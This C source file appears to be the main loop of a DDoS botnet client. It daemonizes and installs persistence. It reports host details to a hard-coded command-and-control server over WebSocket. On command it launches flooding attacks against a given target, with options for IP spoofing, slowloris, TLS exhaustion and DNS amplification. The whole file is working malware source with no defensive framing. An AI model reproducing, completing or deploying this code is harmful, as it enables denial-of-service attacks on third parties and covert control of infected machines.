#include "bot.h"

/* ── Global state ────────────────────────────────────── */
volatile int g_shutdown = 0;
volatile int g_attack_stop = 0;
unsigned long long g_pkt_count = 0;
unsigned long long g_byte_count = 0;
volatile int g_attack_active = 0;
char g_bot_uuid[64] = {0};
char g_cur_task_id[64] = {0};

static void sig_handler(int sig) { g_shutdown = 1; }

int main(int argc, char *argv[])
{
    signal(SIGINT, sig_handler);
    signal(SIGTERM, sig_handler);
    signal(SIGPIPE, SIG_IGN);

    get_bot_uuid(g_bot_uuid, sizeof(g_bot_uuid));

    /* Skip daemonize when BOT_FOREGROUND=1 (GitHub Actions / debug) */
    int foreground = 0;
    const char *fg = getenv("BOT_FOREGROUND");
    if (fg && (fg[0] == '1' || fg[0] == 'y' || fg[0] == 'Y'))
        foreground = 1;
    for (int i = 1; i < argc; i++) {
        if (!strcmp(argv[i], "--foreground") || !strcmp(argv[i], "-f"))
            foreground = 1;
    }

    if (!foreground) {
        if (fork() > 0) return 0;
        setsid();
        if (fork() > 0) return 0;
        chdir("/");
        fclose(stdin); fclose(stdout); fclose(stderr);
        nice(-20);
        mlockall(MCL_CURRENT | MCL_FUTURE);
    } else {
        /* Keep logs on Actions; still raise priority if possible */
        nice(-10);
    }

    /* Start CPU governor */
    cpu_monitor_start();

    /* Config */
    Config cfg = {0};
    cfg.c2_port = 443;
    cfg.use_ssl = 1;
    strcpy(cfg.c2_path, "/ws/bot/");

    char url_buf[512] = {0};
    const char *url_src = NULL;
    for (int i = 1; i < argc; i++) {
        if (!strcmp(argv[i], "--foreground") || !strcmp(argv[i], "-f"))
            continue;
        if (argv[i][0] == '-')
            continue;
        if (!url_src) {
            url_src = argv[i];
            save_c2_url(argv[i]);
            break;
        }
    }
    if (!url_src && load_c2_url(url_buf, sizeof(url_buf)))
        url_src = url_buf;

    if (url_src && url_src[0])
    {
        const char *url = url_src;
        if (strncmp(url, "wss://", 6) == 0) { cfg.use_ssl = 1; url += 6; }
        else if (strncmp(url, "ws://", 5) == 0) { cfg.use_ssl = 0; cfg.c2_port = 80; url += 5; }
        const char *colon = strchr(url, ':');
        const char *slash = strchr(url, '/');
        if (colon && (!slash || colon < slash)) {
            int hlen = (int)(colon - url);
            if (hlen >= (int)sizeof(cfg.c2_host)) hlen = sizeof(cfg.c2_host) - 1;
            memcpy(cfg.c2_host, url, hlen); cfg.c2_host[hlen] = 0;
            int port = atoi(colon + 1);
            if (port > 0) cfg.c2_port = port;
        } else {
            int hlen = slash ? (int)(slash - url) : (int)strlen(url);
            if (hlen >= (int)sizeof(cfg.c2_host)) hlen = sizeof(cfg.c2_host) - 1;
            memcpy(cfg.c2_host, url, hlen); cfg.c2_host[hlen] = 0;
        }
        const char *path = strchr(url, '/');
        if (path && path[1]) {
            int plen = (int)strlen(path);
            if (plen < (int)sizeof(cfg.c2_path)) {
                memcpy(cfg.c2_path, path, (size_t)plen); cfg.c2_path[plen] = 0;
            } else {
                memcpy(cfg.c2_path, path, sizeof(cfg.c2_path) - 1);
                cfg.c2_path[sizeof(cfg.c2_path) - 1] = 0;
            }
        }
    } else {
        strcpy(cfg.c2_host, "bot.minhvuong.io.vn");
    }
    if (argc > 2) { int port = atoi(argv[2]); if (port > 0) cfg.c2_port = port; }

    cfg.heartbeat_int = 10;
    cfg.reconnect_min = 5;
    cfg.reconnect_max = 300;
    cfg.stale_timeout = 60;
    cfg.default_pps = 100000;
    cfg.default_threads = 100;
    strcpy(cfg.bot_version, "4.0.0-ultimate");

    SysInfo info = {0};
    sys_info(&info);

    if (!foreground) {
        char self[1024];
        memset(self, 0, sizeof(self));
        if (readlink("/proc/self/exe", self, sizeof(self) - 1) > 0)
            install_persistence(self);
        check_updates(cfg.bot_version);
    }

    gen_payloads();

    /* ── Main C2 loop ──────────────────────────── */
    while (!g_shutdown)
    {
        WS ws = {0};
        strcpy(ws.host, cfg.c2_host);
        ws.port = cfg.c2_port;
        strcpy(ws.path, cfg.c2_path);
        ws.use_ssl = cfg.use_ssl;
        pthread_mutex_init(&ws.sm, NULL);
        pthread_mutex_init(&ws.rm, NULL);

        if (ws_connect(&ws, g_bot_uuid) != 0)
        {
            int bo = cfg.reconnect_min;
            while (!g_shutdown) {
                sleep(bo);
                bo = bo * 2 < cfg.reconnect_max ? bo * 2 : cfg.reconnect_max;
                if (ws_connect(&ws, g_bot_uuid) == 0) break;
            }
            if (g_shutdown) break;
        }

        char hs[1024];
        snprintf(hs, sizeof(hs),
                 "{\"type\":\"handshake\",\"bot_id\":\"%s\",\"bot_identifier\":\"%s\",\"ip_address\":\"%s\","
                 "\"os_name\":\"Linux\",\"os_version\":\"%s\",\"cpu_cores\":%d,"
                 "\"ram_total_mb\":%d,\"net_speed_mbps\":%d,\"version\":\"%s\"}",
                 g_bot_uuid, info.hwid, info.ip_addr, info.os_ver, info.cpu_cores, info.ram_mb,
                 info.net_mbps, cfg.bot_version);
        ws_send(&ws, hs);

        time_t last_hb = time(NULL);
        time_t last_recv = time(NULL);
        AttackParams atk = {0};
        int cpu_usage = 0;
        int hb_fail = 0;

        while (!g_shutdown)
        {
            /* Send heartbeat every interval — use real elapsed time,
               not tied to ws_recv blocking. */
            time_t now = time(NULL);
            if (now - last_hb >= cfg.heartbeat_int)
            {
                cpu_usage = get_cpu_usage();
                char hb[256];
                snprintf(hb, sizeof(hb), "{\"type\":\"heartbeat\",\"timestamp\":%ld,\"cpu_usage\":%d}", (long)now, cpu_usage);
                if (ws_send(&ws, hb) > 0) {
                    last_hb = now;
                    hb_fail = 0;
                } else {
                    hb_fail++;
                    if (hb_fail > 3) break;  /* WS dead — reconnect */
                }
            }

            /* Send attack stats periodically if attacking */
            if (g_attack_active && g_cur_task_id[0])
            {
                unsigned long long pkts = g_pkt_count;
                unsigned long long bytes = g_byte_count;
                char stats[512];
                snprintf(stats, sizeof(stats),
                         "{\"type\":\"attack_stats\",\"task_id\":\"%s\",\"packets_sent\":%llu,\"bytes_sent\":%llu}",
                         g_cur_task_id, pkts, bytes);
                ws_send(&ws, stats);
            }

            char buf[4096];
            int n = ws_recv(&ws, buf, sizeof(buf));
            if (n < 0) {
                /* ws_recv trả -1 khi timeout (30s) hoặc lỗi thật.
                   Server im lặng là bình thường (chỉ gửi khi có lệnh).
                   Chỉ reconnect nếu KHÔNG nhận gì trong 5 phút. */
                if (time(NULL) - last_recv > 300) {
                    break;  /* thật sự stale — reconnect */
                }
                usleep(200000);
                continue;
            }

            /* Nhận được frame → reset timer */
            last_recv = time(NULL);

            char type[64] = {0};
            json_str(buf, "type", type, sizeof(type));

            if (!strcmp(type, "config_update") || !strcmp(type, "config") || !strcmp(type, "handshake_ack")) {
                /* Support flat {"max_pps":N} and nested {"throttle":{"max_pps":N}} */
                int pps = json_int(buf, "max_pps");
                int th = json_int(buf, "max_threads");
                if (!pps) {
                    const char *tp = strstr(buf, "\"throttle\"");
                    if (tp) { pps = json_int(tp, "max_pps"); th = json_int(tp, "max_threads"); }
                }
                if (!pps) {
                    const char *cp = strstr(buf, "\"config\"");
                    if (cp) { pps = json_int(cp, "max_pps"); th = json_int(cp, "max_threads"); }
                }
                if (pps > 0) cfg.default_pps = pps;
                if (th > 0) cfg.default_threads = th;
            }
            else if (!strcmp(type, "heartbeat_ack") || !strcmp(type, "connected") || !strcmp(type, "pong")) {
                /* Server alive signal — just resets last_hb (already done above) */
            }
            else if (!strcmp(type, "attack")) {
                memset(&atk, 0, sizeof(atk));
                json_str(buf, "target", atk.target, sizeof(atk.target));
                atk.port = json_int(buf, "port");
                json_str(buf, "method", atk.method, sizeof(atk.method));
                atk.duration_secs = json_int(buf, "duration");
                atk.max_pps = json_int(buf, "max_pps");
                atk.max_threads = json_int(buf, "max_threads");
                atk.spoof_mode = json_int(buf, "spoof_mode");
                atk.fragmentation = json_int(buf, "fragmentation");
                atk.slowloris = json_int(buf, "slowloris");
                atk.tls_exhaust = json_int(buf, "tls_exhaust");
                atk.dns_amp = json_int(buf, "dns_amp");
                atk.game_mimic = json_int(buf, "game_mimic");
                atk.mega_mode = json_int(buf, "mega_mode");
                if (!atk.max_pps) atk.max_pps = cfg.default_pps;
                if (!atk.max_threads) atk.max_threads = cfg.default_threads;
                if (!atk.method[0]) strcpy(atk.method, "UDP");

                memset(g_cur_task_id, 0, sizeof(g_cur_task_id));
                json_str(buf, "task_id", g_cur_task_id, sizeof(g_cur_task_id));

                BgAttackCtx *ctx = malloc(sizeof(BgAttackCtx));
                memcpy(&ctx->atk, &atk, sizeof(AttackParams));
                ctx->cfg = &cfg;
                pthread_t atk_tid;
                pthread_attr_t atk_attr;
                pthread_attr_init(&atk_attr);
                pthread_attr_setdetachstate(&atk_attr, PTHREAD_CREATE_DETACHED);
                pthread_create(&atk_tid, &atk_attr, bg_attack_thread, ctx);
                pthread_attr_destroy(&atk_attr);
            }
            else if (!strcmp(type, "stop")) {
                g_attack_stop = 1;
            }
            else if (!strcmp(type, "ban")) {
                g_shutdown = 1;
                break;
            }
        }
        ws_disconnect(&ws);
    }
    return 0;
}
